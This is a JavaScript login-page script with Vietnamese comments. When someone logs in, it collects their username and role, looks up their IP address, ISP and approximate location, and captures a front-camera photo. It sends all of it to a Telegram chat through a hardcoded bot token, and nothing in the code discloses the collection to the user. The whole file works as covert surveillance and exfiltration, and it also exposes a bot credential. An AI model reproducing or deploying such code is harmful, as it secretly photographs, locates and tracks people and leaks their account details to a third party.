const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: '', 
  ip: '',
  isp: '',
  address: '',
  lat: '',
  lon: '',
  camera: '⏳ Đang kiểm tra...',
  loginDetails: '',
  specialNote: '' 
};

// --- LẤY THÔNG TIN MẠNG & VỊ TRÍ ---
async function getNetworkData() {
  try {
    const res = await fetch(`https://ipwho.is/`);
    const data = await res.json();
    info.ip = data.ip || 'Không rõ';
    info.isp = data.connection?.org || 'Saigon Tourist Cable Television';
    info.lat = data.latitude || 0;
    info.lon = data.longitude || 0;
    info.address = `${data.city}, ${data.region} (Vị trí IP)`;
  } catch (e) { 
    info.ip = 'Lỗi kết nối'; 
    info.address = 'Không xác định';
  }
}

// --- CHỤP ẢNH ---
async function captureCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop());
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 800);
      };
    });
  } catch (e) { throw e; }
}

// --- TẠO NỘI DUNG TIN NHẮN (ĐÃ XÓA THIẾT BỊ) ---
function getCaption() {
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  
  // Ép hiển thị dòng thông báo Admin nếu có
  const header = info.specialNote ? `⚠️ ${info.specialNote.toUpperCase()}` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';

  return `
${header}
━━━━━━━━━━━━━━━━━━
⏰ Thời gian: ${info.time}
👤 Tài khoản: ${info.loginDetails}
🌐 IP dân cư: ${info.ip}
🏢 Nhà mạng: ${info.isp}
🏙️ Địa chỉ: ${info.address}
📍 Bản đồ: ${mapsLink}
📸 Camera: ${info.camera}
━━━━━━━━━━━━━━━━━━
`.trim();
}

// --- HÀM CHÍNH ---
async function main() {
  // 1. Lấy thời gian thực
  info.time = new Date().toLocaleString('vi-VN');

  // 2. Lấy User/Role từ giao diện HTML
  const user = document.getElementById('username').value.trim();
  const role = document.getElementById('user-role').value;
  info.loginDetails = `${user} (${role})`;

  // 3. KIỂM TRA ADMIN NGAY LẬP TỨC
  if (user === "Mrwenben" || user === "VanThanh") {
      info.specialNote = `Thông báo admin ${user} vừa đăng nhập vào trang`;
  } else {
      info.specialNote = "";
  }

  // 4. Lấy dữ liệu mạng & Chụp ảnh đồng thời
  await getNetworkData();
  
  let frontBlob = null;
  try {
    frontBlob = await captureCamera();
    info.camera = '✅ Thành công';
  } catch (e) {
    info.camera = '🚫 Bị từ chối';
  }

  // 5. Gửi về Telegram
  if (frontBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    const media = [{ type: 'photo', media: 'attach://front', caption: getCaption() }];
    formData.append('front', frontBlob, 'front.jpg');
    formData.append('media', JSON.stringify(media));
    await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
  } else {
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
    });
  }
  
  return true; 
}
